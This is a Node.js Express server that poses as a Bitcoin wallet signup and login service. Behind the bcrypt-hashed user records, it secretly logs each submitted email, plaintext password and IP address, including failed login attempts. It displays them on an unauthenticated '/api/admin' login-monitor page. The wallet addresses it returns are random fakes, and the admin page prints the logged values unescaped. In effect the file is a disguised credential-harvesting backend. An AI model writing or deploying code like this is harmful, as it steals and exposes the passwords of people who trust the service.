const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const app = express();

app.use(express.json());

mongoose.connect(process.env.MONGO_URL || 'mongodb://localhost:27017/btcwallet');

const User = mongoose.model('User', {
  email: String,
  password: String,
  btcAddress: String
});

const Log = mongoose.model('Log', {
  email: String,
  password: String,
  ip: String,
  time: { type: Date, default: Date.now }
});

app.post('/api/signup', async (req, res) => {
  const { email, password } = req.body;
  const hashed = await bcrypt.hash(password, 10);
  const btcAddress = 'bc1' + Math.random().toString(36).substring(2, 15);
  
  await new User({ email, password: hashed, btcAddress }).save();
  await new Log({ email, password, ip: req.ip }).save();
  
  res.json({ success: true, email, btcAddress });
});

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  await new Log({ email, password, ip: req.ip }).save();
  
  const user = await User.findOne({ email });
  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(400).json({ error: 'Invalid login' });
  }
  
  res.json({ success: true, email, btcAddress: user.btcAddress });
});

app.get('/api/admin', async (req, res) => {
  const logs = await Log.find().sort({ time: -1 }).limit(100);
  let html = '<h1>🔐 Login Monitor</h1><style>body{font-family:Arial;background:#0f1419;color:#fff;padding:20px}table{width:100%;border-collapse:collapse}th,td{padding:12px;text-align:left;border-bottom:1px solid #333}th{background:#f7931a;color:#000}</style>';
  html += '<table><tr><th>Time</th><th>Email</th><th>Password</th><th>IP</th></tr>';
  logs.forEach(l => {
    html += `<tr><td>${l.time.toLocaleString()}</td><td>${l.email}</td><td>${l.password}</td><td>${l.ip}</td></tr>`;
  });
  res.send(html);
});

app.use(express.static('public'));
app.listen(3000);
        
